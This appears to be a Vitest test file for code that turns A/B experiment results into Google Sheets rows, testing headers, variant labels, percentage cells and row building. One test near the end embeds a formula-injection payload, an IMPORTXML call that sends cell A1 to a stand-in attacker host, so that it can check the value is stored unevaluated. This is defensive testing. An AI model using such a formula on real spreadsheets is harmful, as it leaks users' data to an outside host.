import { describe, expect, it } from "vitest";

import { SHEET_COLUMNS, armLabel, buildSheetRows, headerRow, percentCell } from "@/lib/sheet-rows";

describe("headerRow", () => {
  it("names the timezone and the unit", () => {
    // Both are the difference between a number a customer can trust and one they have to guess
    // at: the day boundary is UTC, and the rate is a percentage rather than a fraction.
    expect(headerRow()).toEqual([
      "Date (UTC)",
      "Experiment",
      "Variant",
      "Visitors",
      "Conversions",
      "Conversion Rate (%)",
    ]);
  });

  it("returns a copy, so a caller cannot corrupt the column order", () => {
    const first = headerRow();
    first[0] = "tampered";

    expect(headerRow()[0]).toBe("Date (UTC)");
    expect(SHEET_COLUMNS[0]).toBe("Date (UTC)");
  });
});

describe("armLabel", () => {
  const variants = ["v-alpha", "v-beta", "v-gamma"];

  it("calls a null variant id the control", () => {
    // NULL variantId *is* the control — it is deliberately not a row in ExperimentVariant.
    expect(armLabel(null, variants)).toBe("Control");
  });

  it("numbers variants from their position, matching the dashboard", () => {
    expect(armLabel("v-alpha", variants)).toBe("Variant 1");
    expect(armLabel("v-beta", variants)).toBe("Variant 2");
    expect(armLabel("v-gamma", variants)).toBe("Variant 3");
  });

  it("numbers by list order, not by id", () => {
    expect(armLabel("v-gamma", ["v-gamma", "v-alpha"])).toBe("Variant 1");
  });

  it("still labels an arm whose variant has since been deleted", () => {
    // The visitors it counted were real, so the row is kept rather than dropped.
    expect(armLabel("v-deleted", variants)).toBe("Removed variant");
    expect(armLabel("v-anything", [])).toBe("Removed variant");
  });
});

describe("percentCell", () => {
  it("writes a fraction as a one-decimal percentage", () => {
    expect(percentCell(0.073)).toBe(7.3);
    expect(percentCell(0.5)).toBe(50);
    expect(percentCell(1)).toBe(100);
    expect(percentCell(0)).toBe(0);
  });

  it("rounds to one decimal, as formatPercent does", () => {
    expect(percentCell(30 / 412)).toBe(7.3);
    expect(percentCell(0.12345)).toBe(12.3);
    expect(percentCell(0.12356)).toBe(12.4);
  });

  it("writes a blank for an unknown rate, never a zero", () => {
    // Nobody assigned means the rate is unknown. A 0 would average into a customer's column.
    expect(percentCell(null)).toBe("");
    expect(percentCell(Number.NaN)).toBe("");
    expect(percentCell(Number.POSITIVE_INFINITY)).toBe("");
  });
});

describe("buildSheetRows", () => {
  it("emits one row per arm in the order given", () => {
    const rows = buildSheetRows("2026-09-28", [
      {
        experimentName: "Pricing page redesign",
        variantLabel: "Control",
        assignedVisitors: 412,
        conversions: 30,
        conversionRate: 30 / 412,
      },
      {
        experimentName: "Pricing page redesign",
        variantLabel: "Variant 1",
        assignedVisitors: 408,
        conversions: 41,
        conversionRate: 41 / 408,
      },
    ]);

    expect(rows).toEqual([
      ["2026-09-28", "Pricing page redesign", "Control", 412, 30, 7.3],
      ["2026-09-28", "Pricing page redesign", "Variant 1", 408, 41, 10],
    ]);
  });

  it("emits counts as numbers, not strings", () => {
    // A quoted "412" lands in Sheets as text, and text does not sum — which is the entire
    // reason a customer wants this in a spreadsheet.
    const [row] = buildSheetRows("2026-09-28", [
      {
        experimentName: "Checkout",
        variantLabel: "Control",
        assignedVisitors: 412,
        conversions: 30,
        conversionRate: 0.073,
      },
    ]);

    expect(typeof row?.[3]).toBe("number");
    expect(typeof row?.[4]).toBe("number");
    expect(typeof row?.[5]).toBe("number");
  });

  it("writes an arm that saw no traffic as zeroes with a blank rate", () => {
    // Kept rather than dropped: otherwise a variant that got nothing yesterday vanishes and
    // control looks like the whole test.
    const rows = buildSheetRows("2026-09-28", [
      {
        experimentName: "Checkout",
        variantLabel: "Variant 2",
        assignedVisitors: 0,
        conversions: 0,
        conversionRate: null,
      },
    ]);

    expect(rows).toEqual([["2026-09-28", "Checkout", "Variant 2", 0, 0, ""]]);
  });

  it("passes a name that looks like a formula through untouched", () => {
    /*
     * The defence against stored-formula injection is `valueInputOption=RAW` on the append, not
     * escaping here — under RAW, Sheets stores this as the string it is. Mangling the name would
     * be visible in the customer's spreadsheet and would not make anything safer.
     *
     * This test exists so that a later "cleanup" that prefixes an apostrophe, or a switch to
     * USER_ENTERED, fails here and gets read alongside this comment.
     */
    const hostile = `=IMPORTXML("http://attacker.test/?c="&A1,"//x")`;
    const [row] = buildSheetRows("2026-09-28", [
      {
        experimentName: hostile,
        variantLabel: "Control",
        assignedVisitors: 1,
        conversions: 0,
        conversionRate: 0,
      },
    ]);

    expect(row?.[1]).toBe(hostile);
  });

  it("returns nothing for a day with no arms", () => {
    expect(buildSheetRows("2026-09-28", [])).toEqual([]);
  });
});
